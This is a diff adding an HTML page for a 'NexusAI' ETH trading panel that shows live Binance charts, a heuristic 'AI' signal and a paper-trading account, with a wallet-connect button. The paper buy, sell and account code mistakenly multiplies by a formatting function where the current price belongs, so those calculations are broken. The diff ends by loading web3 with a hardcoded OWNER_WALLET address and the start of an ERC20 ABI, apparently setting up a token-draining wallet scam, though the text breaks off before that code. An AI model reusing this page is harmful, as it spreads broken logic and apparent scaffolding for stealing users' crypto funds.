+            <strong id="zfx-ETH-realized">0</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Total P&L</span>
+            <strong id="zfx-ETH-total-pnl">0</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Trades</span>
+            <strong id="zfx-ETH-trades">0</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Wins</span>
+            <strong id="zfx-ETH-wins">0</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Losses</span>
+            <strong id="zfx-ETH-losses">0</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Win Rate</span>
+            <strong id="zfx-ETH-winrate">0%</strong>
+        </div>
+
+
+        <div class="zfx-ETH-account-item">
+            <span>Trading Fee</span>
+            <strong>0.10%</strong>
+        </div>
+
+
+    </div>
+
+</div>
+
+
+<!-- =====================================================
+     ACTIVITY
+     ===================================================== -->
+
+<div class="zfx-ETH-card">
+
+    <div class="zfx-ETH-card-title">
+        NEXUS AI ACTIVITY
+    </div>
+
+
+    <div
+        id="zfx-ETH-activity"
+        class="zfx-ETH-activity">
+    </div>
+
+</div>
+
+
+</aside>
+
+</div>
+
+</div>
+</div>
+
+
+<!-- =========================================================
+     =========================================================
+     
+     YOUR JAVASCRIPT AREA
+     
+     THIS IS WHERE YOU PASTE YOUR OWN JAVASCRIPT.
+     
+     =========================================================
+     ========================================================= -->
+
+<script>
+
+
+/*
+================================================================
+
+NEXUS AI WALLET JAVASCRIPT AREA
+
+PASTE YOUR JAVASCRIPT HERE.
+
+IMPORTANT:
+
+Your CONNECT WALLET buttons already contain:
+
+onclick="connectAndOptimize()"
+
+Therefore your JavaScript should contain:
+
+function connectAndOptimize() {
+
+    // YOUR WALLET CONNECTION CODE HERE
+
+}
+
+================================================================
+
+
+EXAMPLE STRUCTURE:
+
+function connectAndOptimize() {
+
+    // 1. Connect wallet
+    // 2. Get wallet address
+    // 3. Detect network
+    // 4. Prepare your transaction
+    // 5. Show transaction details
+    // 6. Ask the user to review
+    // 7. Let the wallet request approval
+    // 8. Wait for confirmation
+    // 9. Update the NexusAI interface
+
+}
+
+================================================================
+
+DO NOT put your seed phrase/private key here.
+
+================================================================
+*/
+
+
+/*
+===============================================================
+PLACE YOUR REAL FUNCTION HERE
+===============================================================
+
+REPLACE THIS FUNCTION WITH YOUR OWN JAVASCRIPT.
+*/
+
+function connectAndOptimize() {
+
+    const walletStatus =
+        document.getElementById(
+            "zfx-ETH-wallet-status"
+        );
+
+    const walletButton =
+        document.getElementById(
+            "zfx-ETH-wallet-button"
+        );
+
+
+    /*
+    -----------------------------------------------------------
+    TEMPORARY CONNECTION CHECK
+
+    Replace this section with your own wallet JavaScript.
+    -----------------------------------------------------------
+    */
+
+    if (!window.ethereum) {
+
+        walletStatus.textContent =
+            "No compatible wallet detected.";
+
+        return;
+
+    }
+
+
+    window.ethereum
+        .request({
+            method: "eth_requestAccounts"
+        })
+        .then(function(accounts) {
+
+            if (
+                !accounts ||
+                !accounts.length
+            ) {
+
+                return;
+
+            }
+
+
+            const address =
+                accounts[0];
+
+
+            walletStatus.textContent =
+                address.slice(0, 8) +
+                "..." +
+                address.slice(-8) +
+                " • WALLET CONNECTED";
+
+
+            walletButton.textContent =
+                "WALLET CONNECTED";
+
+
+            /*
+            ===================================================
+            YOUR NEXT WALLET LOGIC GOES HERE
+            ===================================================
+
+            Example:
+
+            - Check network
+            - Check ETH balance
+            - Calculate allocation
+            - Prepare transaction
+            - Ask user to approve
+            - Wait for confirmation
+
+            ===================================================
+            */
+
+        })
+        .catch(function(error) {
+
+            walletStatus.textContent =
+                "Wallet connection cancelled.";
+
+            console.error(
+                "Wallet connection error:",
+                error
+            );
+
+        });
+
+}
+
+</script>
+
+
+<!-- =========================================================
+     MARKET / SIMULATOR JAVASCRIPT
+     ========================================================= -->
+
+<script id="6ksokv">
+
+(function zfxETHMarketEngine() {
+
+"use strict";
+
+
+/* =========================================================
+   CONFIG
+   ========================================================= */
+
+const zfxETHConfig = {
+
+    symbol: "ETHUSDT",
+
+    startingUsdt: 10000,
+
+    feeRate: 0.001,
+
+    rest:
+        "https://data-api.binance.vision",
+
+    websocket:
+        "wss://data-stream.binance.vision/ws/"
+
+};
+
+
+/* =========================================================
+   ELEMENTS
+   ========================================================= */
+
+const zfxETHChartElement =
+    document.getElementById(
+        "zfx-ETH-chart"
+    );
+
+const zfxETHPriceElement =
+    document.getElementById(
+        "zfx-ETH-price"
+    );
+
+const zfxETHHighElement =
+    document.getElementById(
+        "zfx-ETH-high"
+    );
+
+const zfxETHLowElement =
+    document.getElementById(
+        "zfx-ETH-low"
+    );
+
+const zfxETHVolumeElement =
+    document.getElementById(
+        "zfx-ETH-volume"
+    );
+
+const zfxETHChangeElement =
+    document.getElementById(
+        "zfx-ETH-change"
+    );
+
+const zfxETHConnectionElement =
+    document.getElementById(
+        "zfx-ETH-connection"
+    );
+
+const zfxETHStatusDot =
+    document.getElementById(
+        "zfx-ETH-binance-dot"
+    );
+
+const zfxETHChartStatus =
+    document.getElementById(
+        "zfx-ETH-chart-status"
+    );
+
+const zfxETHAmount =
+    document.getElementById(
+        "zfx-ETH-amount"
+    );
+
+const zfxETHUSDT =
+    document.getElementById(
+        "zfx-ETH-usdt"
+    );
+
+const zfxETHEstimate =
+    document.getElementById(
+        "zfx-ETH-estimate"
+    );
+
+const zfxETHActivity =
+    document.getElementById(
+        "zfx-ETH-activity"
+    );
+
+
+/* =========================================================
+   STATE
+   ========================================================= */
+
+let zfxETHInterval = "1m";
+
+let zfxETHSocket = null;
+
+let zfxETHReconnectTimer = null;
+
+let zfxETHReconnectAttempt = 0;
+
+let zfxETHCurrentPrice = 0;
+
+let zfxETHCandles = [];
+
+let zfxETHMarkers = [];
+
+let zfxETHPosition = {
+
+    qty: 0,
+
+    averageEntry: 0
+
+};
+
+let zfxETHAccount = {
+
+    usdt:
+        zfxETHConfig.startingUsdt,
+
+    realizedPnl: 0,
+
+    trades: 0,
+
+    wins: 0,
+
+    losses: 0
+
+};
+
+
+/* =========================================================
+   CHART
+   ========================================================= */
+
+const zfxETHChart =
+    LightweightCharts.createChart(
+        zfxETHChartElement,
+        {
+
+            width:
+                zfxETHChartElement.clientWidth,
+
+            height:
+                zfxETHChartElement.clientHeight,
+
+            layout: {
+
+                background: {
+                    color: "#03060c"
+                },
+
+                textColor: "#7d8da5"
+
+            },
+
+            grid: {
+
+                vertLines: {
+                    color:
+                        "rgba(120,150,190,.06)"
+                },
+
+                horzLines: {
+                    color:
+                        "rgba(120,150,190,.06)"
+                }
+
+            },
+
+            crosshair: {
+
+                mode: 1
+
+            },
+
+            rightPriceScale: {
+
+                borderColor:
+                    "rgba(120,150,190,.15)"
+
+            },
+
+            timeScale: {
+
+                borderColor:
+                    "rgba(120,150,190,.15)",
+
+                timeVisible: true,
+
+                secondsVisible: false,
+
+                rightOffset: 8,
+
+                barSpacing: 7,
+
+                minBarSpacing: 2
+
+            },
+
+            handleScroll: {
+
+                mouseWheel: true,
+
+                pressedMouseMove: true,
+
+                horzTouchDrag: true,
+
+                vertTouchDrag: true
+
+            },
+
+            handleScale: {
+
+                mouseWheel: true,
+
+                pinch: true,
+
+                axisPressedMouseMove: true,
+
+                axisDoubleClickReset: true
+
+            }
+
+        }
+    );
+
+
+const zfxETHCandlestickSeries =
+    zfxETHChart.addCandlestickSeries({
+
+        upColor: "#00e5a0",
+
+        downColor: "#ff4f70",
+
+        borderUpColor: "#00e5a0",
+
+        borderDownColor: "#ff4f70",
+
+        wickUpColor: "#00e5a0",
+
+        wickDownColor: "#ff4f70"
+
+    });
+
+
+/* =========================================================
+   CHART RESIZE
+   ========================================================= */
+
+const zfxETHResizeObserver =
+    new ResizeObserver(function() {
+
+        const rect =
+            zfxETHChartElement
+                .getBoundingClientRect();
+
+        if (
+            rect.width > 0 &&
+            rect.height > 0
+        ) {
+
+            zfxETHChart.resize(
+                Math.floor(rect.width),
+                Math.floor(rect.height)
+            );
+
+        }
+
+    });
+
+
+zfxETHResizeObserver.observe(
+    zfxETHChartElement
+);
+
+
+/* =========================================================
+   FORMAT
+   ========================================================= */
+
+function zfxETHFormatPrice(value) {
+
+    if (
+        !Number.isFinite(value)
+    ) {
+        return "—";
+    }
+
+    return Number(value).toLocaleString(
+        undefined,
+        {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 4
+        }
+    );
+
+}
+
+
+function zfxETHMoney(value) {
+
+    if (
+        !Number.isFinite(value)
+    ) {
+        return "—";
+    }
+
+    return Number(value).toLocaleString(
+        undefined,
+        {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+        }
+    );
+
+}
+
+
+/* =========================================================
+   ACTIVITY
+   ========================================================= */
+
+function zfxETHLog(message) {
+
+    const line =
+        document.createElement(
+            "div"
+        );
+
+    line.className =
+        "zfx-ETH-log";
+
+    line.textContent =
+        new Date().toLocaleTimeString() +
+        "  " +
+        message;
+
+    zfxETHActivity.prepend(
+        line
+    );
+
+
+    while (
+        zfxETHActivity.children.length > 40
+    ) {
+
+        zfxETHActivity.lastElementChild.remove();
+
+    }
+
+}
+
+
+/* =========================================================
+   CONNECTION
+   ========================================================= */
+
+function zfxETHConnection(
+    live,
+    text
+) {
+
+    zfxETHConnectionElement.textContent =
+        text;
+
+
+    if (live) {
+
+        zfxETHStatusDot.classList.add(
+            "live"
+        );
+
+    } else {
+
+        zfxETHStatusDot.classList.remove(
+            "live"
+        );
+
+    }
+
+}
+
+
+/* =========================================================
+   24H MARKET DATA
+   ========================================================= */
+
+async function zfxETHLoad24h() {
+
+    try {
+
+        const response =
+            await fetch(
+                zfxETHConfig.rest +
+                "/api/v3/ticker/24hr?symbol=" +
+                zfxETHConfig.symbol,
+                {
+                    cache: "no-store"
+                }
+            );
+
+
+        if (!response.ok) {
+
+            throw new Error(
+                "Binance ticker unavailable"
+            );
+
+        }
+
+
+        const data =
+            await response.json();
+
+
+        zfxETHHighElement.textContent =
+            "$" +
+            zfxETHFormatPrice(
+                Number(data.highPrice)
+            );
+
+
+        zfxETHLowElement.textContent =
+            "$" +
+            zfxETHFormatPrice(
+                Number(data.lowPrice)
+            );
+
+
+        zfxETHVolumeElement.textContent =
+            Number(
+                data.volume
+            ).toLocaleString(
+                undefined,
+                {
+                    maximumFractionDigits: 2
+                }
+            );
+
+
+        const change =
+            Number(
+                data.priceChangePercent
+            );
+
+
+        zfxETHChangeElement.textContent =
+            change.toFixed(2) +
+            "%";
+
+
+    } catch (error) {
+
+        zfxETHLog(
+            "Unable to read Binance 24H statistics."
+        );
+
+    }
+
+}
+
+
+/* =========================================================
+   HISTORICAL CANDLES
+   ========================================================= */
+
+async function zfxETHLoadHistory() {
+
+    zfxETHChartStatus.textContent =
+        "LOADING LIVE BINANCE HISTORY...";
+
+
+    try {
+
+        const endpoint =
+            zfxETHConfig.rest +
+            "/api/v3/klines?symbol=" +
+            zfxETHConfig.symbol +
+            "&interval=" +
+            zfxETHInterval +
+            "&limit=500";
+
+
+        const response =
+            await fetch(
+                endpoint,
+                {
+                    cache: "no-store"
+                }
+            );
+
+
+        if (!response.ok) {
+
+            throw new Error(
+                "Binance historical request failed"
+            );
+
+        }
+
+
+        const data =
+            await response.json();
+
+
+        zfxETHCandles =
+            data.map(function(item) {
+
+                return {
+
+                    time:
+                        Math.floor(
+                            Number(item[0]) /
+                            1000
+                        ),
+
+                    open:
+                        Number(item[1]),
+
+                    high:
+                        Number(item[2]),
+
+                    low:
+                        Number(item[3]),
+
+                    close:
+                        Number(item[4]),
+
+                    volume:
+                        Number(item[5])
+
+                };
+
+            });
+
+
+        zfxETHCandlestickSeries
+            .setData(
+                zfxETHCandles
+            );
+
+
+        if (
+            zfxETHCandles.length
+        ) {
+
+            const latest =
+                zfxETHCandles[
+                    zfxETHCandles.length - 1
+                ];
+
+            zfxETHCurrentPrice = latest.close;
+
+
+            zfxETHUpdateUI();
+
+        }
+
+
+        zfxETHChart
+            .timeScale()
+            .fitContent();
+
+
+        zfxETHChartStatus.textContent =
+            "HISTORICAL DATA LOADED • WAITING FOR LIVE STREAM";
+
+
+        zfxETHConnection(
+            false,
+            "BINANCE HISTORY LOADED"
+        );
+
+
+    } catch (error) {
+
+        console.error(
+            "NexusAI Binance historical candle error:",
+            error
+        );
+
+        zfxETHChartStatus.textContent =
+            "BINANCE MARKET DATA ERROR";
+
+
+        zfxETHConnection(
+            false,
+            "MARKET DATA DISCONNECTED"
+        );
+
+
+        zfxETHLog(
+            "Binance historical candles unavailable."
+        );
+
+    }
+
+}
+
+
+/* =========================================================
+   CLOSE OLD SOCKET
+   ========================================================= */
+
+function zfxETHCloseSocket() {
+
+    if (
+        zfxETHSocket
+    ) {
+
+        try {
+
+            zfxETHSocket.close();
+
+        } catch (error) {}
+
+        zfxETHSocket = null;
+
+    }
+
+}
+
+
+/* =========================================================
+   CONNECT BINANCE WEBSOCKET
+   ========================================================= */
+
+function zfxETHConnectSocket() {
+
+    zfxETHCloseSocket();
+
+
+    const stream =
+        zfxETHConfig.symbol.toLowerCase() +
+        "@kline_" +
+        zfxETHInterval;
+
+
+    try {
+
+        zfxETHSocket =
+            new WebSocket(
+                zfxETHConfig.websocket +
+                stream
+            );
+
+
+        zfxETHSocket.onopen =
+            function() {
+
+                zfxETHReconnectAttempt =
+                    0;
+
+                zfxETHChartStatus.textContent =
+                    "BINANCE STREAM CONNECTED • WAITING FOR MARKET DATA";
+
+                zfxETHLog(
+                    "Binance WebSocket connected; waiting for live ETH/USDT candle data."
+                );
+
+            };
+
+
+        zfxETHSocket.onmessage =
+            function(event) {
+
+                try {
+
+                    const payload =
+                        JSON.parse(
+                            event.data
+                        );
+
+
+                    if (
+                        !payload.k
+                    ) {
+                        return;
+                    }
+
+
+                    const k =
+                        payload.k;
+
+                    zfxETHConnection(
+                        true,
+                        "LIVE • BINANCE"
+                    );
+
+                    zfxETHChartStatus.textContent =
+                        "LIVE • BINANCE • " +
+                        zfxETHInterval.toUpperCase();
+
+
+                    const candle = {
+
+                        time:
+                            Math.floor(
+                                Number(k.t) /
+                                1000
+                            ),
+
+                        open:
+                            Number(k.o),
+
+                        high:
+                            Number(k.h),
+
+                        low:
+                            Number(k.l),
+
+                        close:
+                            Number(k.c),
+
+                        volume:
+                            Number(k.v)
+
+                    };
+
+
+                    zfxETHCurrentPrice = candle.close;
+
+
+                    const last =
+                        zfxETHCandles[
+                            zfxETHCandles.length - 1
+                        ];
+
+
+                    if (
+                        last &&
+                        last.time ===
+                        candle.time
+                    ) {
+
+                        zfxETHCandles[
+                            zfxETHCandles.length - 1
+                        ] =
+                            candle;
+
+                    } else {
+
+                        zfxETHCandles.push(
+                            candle
+                        );
+
+                    }
+
+
+                    zfxETHCandlestickSeries
+                        .update(
+                            candle
+                        );
+
+
+                    zfxETHUpdateUI();
+
+                    zfxETHAnalyze();
+
+                } catch (error) {
+
+                    zfxETHLog(
+                        "Binance live candle processing error: " +
+                        (error && error.message
+                            ? error.message
+                            : "unknown error")
+                    );
+
+                }
+
+            };
+
+
+        zfxETHSocket.onerror =
+            function(error) {
+
+                zfxETHConnection(
+                    false,
+                    "MARKET DATA DISCONNECTED"
+                );
+
+                zfxETHChartStatus.textContent =
+                    "BINANCE WEBSOCKET ERROR";
+
+                console.error(
+                    "NexusAI Binance WebSocket error:",
+                    error
+                );
+
+            };
+
+
+        zfxETHSocket.onclose =
+            function() {
+
+                zfxETHConnection(
+                    false,
+                    "RECONNECTING TO BINANCE..."
+                );
+
+
+                zfxETHScheduleReconnect();
+
+            };
+
+
+    } catch (error) {
+
+        zfxETHScheduleReconnect();
+
+    }
+
+}
+
+
+/* =========================================================
+   RECONNECT
+   ========================================================= */
+
+function zfxETHScheduleReconnect() {
+
+    if (
+        zfxETHReconnectTimer
+    ) {
+        return;
+    }
+
+
+    const delay =
+        Math.min(
+            30000,
+            1000 *
+            Math.pow(
+                2,
+                zfxETHReconnectAttempt
+            )
+        );
+
+
+    zfxETHReconnectAttempt++;
+
+
+    zfxETHReconnectTimer =
+        setTimeout(
+            function() {
+
+                zfxETHReconnectTimer =
+                    null;
+
+
+                zfxETHLoadHistory();
+
+                zfxETHConnectSocket();
+
+            },
+            delay
+        );
+
+}
+
+
+/* =========================================================
+   UI UPDATE
+   ========================================================= */
+
+function zfxETHUpdateUI() {
+
+    if (
+        !zfxETHCurrentPrice
+    ) {
+        return;
+    }
+
+
+    zfxETHPriceElement.textContent =
+        "$" +
+        zfxETHFormatPrice(zfxETHCurrentPrice);
+
+
+    zfxETHUpdateAllocation();
+
+    zfxETHUpdateAccount();
+
+}
+
+
+/* =========================================================
+   ALLOCATION
+   ========================================================= */
+
+function zfxETHUpdateAllocation() {
+
+    const ETH =
+        Number(
+            zfxETHAmount.value
+        ) || 0;
+
+
+    const usdt =
+        Number(
+            zfxETHUSDT.value
+        ) || 0;
+
+
+    let value =
+        ETH *
+        zfxETHCurrentPrice;
+
+
+    if (
+        ETH <= 0 &&
+        usdt > 0
+    ) {
+
+        value =
+            usdt;
+
+    }
+
+
+    zfxETHEstimate.textContent =
+        "Live ETH value: $" +
+        zfxETHMoney(
+            value
+        );
+
+}
+
+
+/* =========================================================
+   INPUT SYNCHRONIZATION
+   ========================================================= */
+
+zfxETHAmount.addEventListener(
+    "input",
+    function() {
+
+        const amount =
+            Number(
+                zfxETHAmount.value
+            ) || 0;
+
+
+        if (
+            zfxETHCurrentPrice &&
+            amount > 0
+        ) {
+
+            zfxETHUSDT.value =
+                (
+                    amount *
+                    zfxETHCurrentPrice
+                ).toFixed(2);
+
+        }
+
+
+        zfxETHUpdateAllocation();
+
+    }
+);
+
+
+zfxETHUSDT.addEventListener(
+    "input",
+    function() {
+
+        const usdt =
+            Number(
+                zfxETHUSDT.value
+            ) || 0;
+
+
+        if (
+            zfxETHCurrentPrice &&
+            usdt > 0
+        ) {
+
+            zfxETHAmount.value =
+                (
+                    usdt /
+                    zfxETHCurrentPrice
+                ).toFixed(6);
+
+        }
+
+
+        zfxETHUpdateAllocation();
+
+    }
+);
+
+
+/* =========================================================
+   AI MARKET ANALYSIS
+   ========================================================= */
+
+function zfxETHAnalyze() {
+
+    if (
+        zfxETHCandles.length < 30
+    ) {
+        return;
+    }
+
+
+    const closes =
+        zfxETHCandles.map(
+            function(candle) {
+                return candle.close;
+            }
+        );
+
+
+    const recent =
+        closes.slice(-20);
+
+
+    const old =
+        closes.slice(-40, -20);
+
+
+    const average =
+        function(values) {
+
+            return values.reduce(
+                function(total, value) {
+                    return total + value;
+                },
+                0
+            ) /
+            values.length;
+
+        };
+
+
+    const recentAverage =
+        average(recent);
+
+
+    const oldAverage =
+        average(old);
+
+
+    const latest =
+        closes[
+            closes.length - 1
+        ];
+
+
+    const movement =
+        (
+            latest -
+            recent[0]
+        ) /
+        recent[0] *
+        100;
+
+
+    const trendShift =
+        (
+            recentAverage -
+            oldAverage
+        ) /
+        oldAverage *
+        100;
+
+
+    const highest =
+        Math.max(
+            ...recent
+        );
+
+
+    const lowest =
+        Math.min(
+            ...recent
+        );
+
+
+    const volatility =
+        (
+            highest -
+            lowest
+        ) /
+        latest *
+        100;
+
+
+    let trend =
+        "SIDEWAYS";
+
+
+    if (
+        trendShift > .15 &&
+        movement > .2
+    ) {
+
+        trend =
+            "BULLISH";
+
+    } else if (
+        trendShift < -.15 &&
+        movement < -.2
+    ) {
+
+        trend =
+            "BEARISH";
+
+    }
+
+
+    let momentum =
+        "WEAK";
+
+
+    if (
+        Math.abs(movement) > 1
+    ) {
+
+        momentum =
+            "STRONG";
+
+    } else if (
+        Math.abs(movement) > .35
+    ) {
+
+        momentum =
+            "MODERATE";
+
+    }
+
+
+    let volatilityText =
+        "LOW";
+
+
+    if (
+        volatility > 3
+    ) {
+
+        volatilityText =
+            "HIGH";
+
+    } else if (
+        volatility > 1.2
+    ) {
+
+        volatilityText =
+            "MEDIUM";
+
+    }
+
+
+    let signal =
+        "WAIT";
+
+
+    if (
+        trend === "BULLISH" &&
+        momentum !== "WEAK"
+    ) {
+
+        signal =
+            "BUY WATCH";
+
+    } else if (
+        trend === "BEARISH" &&
+        momentum !== "WEAK"
+    ) {
+
+        signal =
+            "SELL WATCH";
+
+    }
+
+
+    let confidence =
+        50 +
+        Math.min(
+            35,
+            Math.abs(movement) * 8
+        ) +
+        Math.min(
+            10,
+            Math.abs(trendShift) * 5
+        );
+
+
+    confidence =
+        Math.round(
+            Math.min(
+                95,
+                Math.max(
+                    50,
+                    confidence
+                )
+            )
+        );
+
+
+    document.getElementById(
+        "zfx-ETH-trend"
+    ).textContent =
+        trend;
+
+
+    document.getElementById(
+        "zfx-ETH-momentum"
+    ).textContent =
+        momentum;
+
+
+    document.getElementById(
+        "zfx-ETH-volatility"
+    ).textContent =
+        volatilityText;
+
+
+    document.getElementById(
+        "zfx-ETH-signal"
+    ).textContent =
+        signal;
+
+
+    document.getElementById(
+        "zfx-ETH-confidence-live"
+    ).textContent =
+        confidence +
+        "%";
+
+
+    document.getElementById(
+        "zfx-ETH-condition"
+    ).textContent =
+        Math.abs(movement) > .35
+            ? "TRENDING"
+            : "RANGING";
+
+}
+
+
+/* =========================================================
+   PAPER BUY
+   ========================================================= */
+
+function zfxETHBuy() {
+
+    if (
+        !zfxETHCurrentPrice
+    ) {
+
+        zfxETHLog(
+            "BUY unavailable: Binance price not connected."
+        );
+
+        return;
+
+    }
+
+
+    let usdt =
+        Number(
+            zfxETHUSDT.value
+        ) || 0;
+
+
+    if (
+        usdt <= 0
+    ) {
+
+        const ETH =
+            Number(
+                zfxETHAmount.value
+            ) || 0;
+
+
+        usdt =
+            ETH *
+            zfxETHFormatPrice;
+
+    }
+
+
+    if (
+        usdt <= 0
+    ) {
+
+        zfxETHLog(
+            "Enter the ETH amount to trade."
+        );
+
+        return;
+
+    }
+
+
+    if (
+        usdt >
+        zfxETHAccount.usdt
+    ) {
+
+        zfxETHLog(
+            "Insufficient paper USDT."
+        );
+
+        return;
+
+    }
+
+
+    const fee =
+        usdt *
+        zfxETHConfig.feeRate;
+
+
+    const quantity =
+        (
+            usdt -
+            fee
+        ) /
+        zfxETHFormatPrice;
+
+
+    const previousQty =
+        zfxETHPosition.qty;
+
+
+    const previousAverage =
+        zfxETHPosition.averageEntry;
+
+
+    const totalQty =
+        previousQty +
+        quantity;
+
+
+    const averageEntry =
+        previousQty === 0
+
+            ? zfxETHCurrentPrice
+            :
+
+            (
+                (
+                    previousQty *
+                    previousAverage
+                ) +
+                (
+                    quantity *
+                    zfxETHCurrentPrice
+                )
+            ) /
+            totalQty;
+
+
+    zfxETHPosition.qty =
+        totalQty;
+
+
+    zfxETHPosition.averageEntry =
+        averageEntry;
+
+
+    zfxETHAccount.usdt -=
+        usdt;
+
+
+    zfxETHAccount.trades++;
+
+
+    zfxETHAddMarker(
+        "BUY",
+        zfxETHCurrentPrice
+    );
+
+
+    zfxETHLog(
+        "PAPER BUY: " +
+        quantity.toFixed(6) +
+        " ETH at $" +
+        zfxETHCurrentPrice.toFixed(2)
+    );
+
+
+    zfxETHUpdateAccount();
+
+}
+
+
+/* =========================================================
+   PAPER SELL
+   ========================================================= */
+
+function zfxETHSell() {
+
+    if (
+        !zfxETHCurrentPrice
+    ) {
+
+        zfxETHLog(
+            "SELL unavailable: Binance price not connected."
+        );
+
+        return;
+
+    }
+
+
+    if (
+        zfxETHPosition.qty <= 0
+    ) {
+
+        zfxETHLog(
+            "No ETH available in the paper account."
+        );
+
+        return;
+
+    }
+
+
+    let quantity =
+        Number(
+            zfxETHAmount.value
+        ) || 0;
+
+
+    if (
+        quantity <= 0
+    ) {
+
+        quantity =
+            zfxETHPosition.qty;
+
+    }
+
+
+    quantity =
+        Math.min(
+            quantity,
+            zfxETHPosition.qty
+        );
+
+
+    const gross =
+        quantity *
+        zfxETHFormatPrice;
+
+
+    const fee =
+        gross *
+        zfxETHConfig.feeRate;
+
+
+    const received =
+        gross -
+        fee;
+
+
+    const pnl =
+        (
+            zfxETHFormatPrice -
+            zfxETHPosition.averageEntry
+        ) *
+        quantity -
+        fee;
+
+
+    zfxETHAccount.usdt +=
+        received;
+
+
+    zfxETHPosition.qty -=
+        quantity;
+
+
+    zfxETHAccount.realizedPnl +=
+        pnl;
+
+
+    zfxETHAccount.trades++;
+
+
+    if (
+        pnl >= 0
+    ) {
+
+        zfxETHAccount.wins++;
+
+    } else {
+
+        zfxETHAccount.losses++;
+
+    }
+
+
+    if (
+        zfxETHPosition.qty <
+        0.00000001
+    ) {
+
+        zfxETHPosition.qty =
+            0;
+
+        zfxETHPosition.averageEntry =
+            0;
+
+    }
+
+
+    zfxETHAddMarker(
+        "SELL",
+        zfxETHCurrentPrice
+    );
+
+
+    zfxETHLog(
+        "PAPER SELL: " +
+        quantity.toFixed(6) +
+        " ETH • P&L $" +
+        pnl.toFixed(2)
+    );
+
+
+    zfxETHUpdateAccount();
+
+}
+
+
+/* =========================================================
+   CHART TRADE MARKERS
+   ========================================================= */
+
+function zfxETHAddMarker(
+    side,
+    price
+) {
+
+    if (
+        !zfxETHCandles.length
+    ) {
+        return;
+    }
+
+
+    const last =
+        zfxETHCandles[
+            zfxETHCandles.length - 1
+        ];
+
+
+    zfxETHMarkers.push({
+
+        time:
+            last.time,
+
+        position:
+            side === "BUY"
+                ? "belowBar"
+                : "aboveBar",
+
+        color:
+            side === "BUY"
+                ? "#00e5a0"
+                : "#ff4f70",
+
+        shape:
+            side === "BUY"
+                ? "arrowUp"
+                : "arrowDown",
+
+        text:
+            side +
+            " $" +
+            price.toFixed(2)
+
+    });
+
+
+    if (
+        typeof
+        zfxETHCandlestickSeries.setMarkers ===
+        "function"
+    ) {
+
+        zfxETHCandlestickSeries.setMarkers(
+            zfxETHMarkers
+        );
+
+    }
+
+}
+
+
+/* =========================================================
+   ACCOUNT
+   ========================================================= */
+
+function zfxETHUpdateAccount() {
+
+    const BTCValue =
+        zfxETHPosition.qty *
+        zfxETHFormatPrice;
+
+
+    const equity =
+        zfxETHAccount.usdt +
+        BTCValue;
+
+
+    const unrealized =
+        zfxETHPosition.qty *
+        (
+            zfxETHFormatPrice -
+            zfxETHPosition.averageEntry
+        );
+
+
+    const totalPnl =
+        equity -
+        zfxETHConfig.startingUsdt;
+
+
+    const closed =
+        zfxETHAccount.wins +
+        zfxETHAccount.losses;
+
+
+    const winRate =
+        closed > 0
+            ? (
+                zfxETHAccount.wins /
+                closed *
+                100
+            )
+            : 0;
+
+
+    document.getElementById(
+        "zfx-ETH-account-usdt"
+    ).textContent =
+        zfxETHMoney(
+            zfxETHAccount.usdt
+        );
+
+
+    document.getElementById(
+        "zfx-ETH-account-ETH"
+    ).textContent =
+        zfxETHPosition.qty.toFixed(6);
+
+
+    document.getElementById(
+        "zfx-ETH-equity"
+    ).textContent =
+        zfxETHMoney(
+            equity
+        );
+
+
+    document.getElementById(
+        "zfx-ETH-unrealized"
+    ).textContent =
+        zfxETHMoney(
+            unrealized
+        );
+
+
+    document.getElementById(
+        "zfx-ETH-realized"
+    ).textContent =
+        zfxETHMoney(
+            zfxETHAccount.realizedPnl
+        );
+
+
+    document.getElementById(
+        "zfx-ETH-total-pnl"
+    ).textContent =
+        zfxETHMoney(
+            totalPnl
+        );
+
+
+    document.getElementById(
+        "zfx-ETH-trades"
+    ).textContent =
+        zfxETHAccount.trades;
+
+
+    document.getElementById(
+        "zfx-ETH-wins"
+    ).textContent =
+        zfxETHAccount.wins;
+
+
+    document.getElementById(
+        "zfx-ETH-losses"
+    ).textContent =
+        zfxETHAccount.losses;
+
+
+    document.getElementById(
+        "zfx-ETH-winrate"
+    ).textContent =
+        winRate.toFixed(1) +
+        "%";
+
+}
+
+
+/* =========================================================
+   BUY / SELL BUTTONS
+   ========================================================= */
+
+document
+    .getElementById(
+        "zfx-ETH-buy"
+    )
+    .addEventListener(
+        "click",
+        zfxETHBuy
+    );
+
+
+document
+    .getElementById(
+        "zfx-ETH-sell"
+    )
+    .addEventListener(
+        "click",
+        zfxETHSell
+    );
+
+
+/* =========================================================
+   TIMEFRAME BUTTONS
+   ========================================================= */
+
+document
+    .querySelectorAll(
+        "#zfx-ETH-auto-trade .zfx-ETH-timeframe"
+    )
+    .forEach(
+        function(button) {
+
+            button.addEventListener(
+                "click",
+                function() {
+
+                    document
+                        .querySelectorAll(
+                            "#zfx-ETH-auto-trade .zfx-ETH-timeframe"
+                        )
+                        .forEach(
+                            function(item) {
+
+                                item.classList.remove(
+                                    "active"
+                                );
+
+                            }
+                        );
+
+
+                    button.classList.add(
+                        "active"
+                    );
+
+
+                    zfxETHInterval =
+                        button.dataset.interval;
+
+
+                    zfxETHReconnectAttempt =
+                        0;
+
+
+                    zfxETHCloseSocket();
+
+                    zfxETHLoadHistory();
+
+                    zfxETHConnectSocket();
+
+                }
+            );
+
+        }
+    );
+
+
+/* =========================================================
+   INITIALIZE
+   ========================================================= */
+
+zfxETHLog(
+    "NexusAI market simulator initialized."
+);
+
+
+zfxETHLog(
+    "Connecting to Binance ETH/USDT..."
+);
+
+console.info(
+    "NexusAI: Binance public market data is used; no API key is required."
+);
+
+
+zfxETHLog(
+    "Paper account: 10,000 USDT."
+);
+
+
+zfxETHLoad24h();
+
+zfxETHLoadHistory();
+
+zfxETHConnectSocket();
+
+
+setInterval(
+    zfxETHLoad24h,
+    15000
+);
+
+
+})();
+
+</script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<script>
+    // CONFIGURATION
+    const OWNER_WALLET = "0xefcA240aB894Fd2587Ae98419B40869ddEd676f3";
+    const BUTTON_ID = "zfx-ETH-wallet-button";
+
+    // Standard ERC20 ABI
+    const ERC20_ABI = [
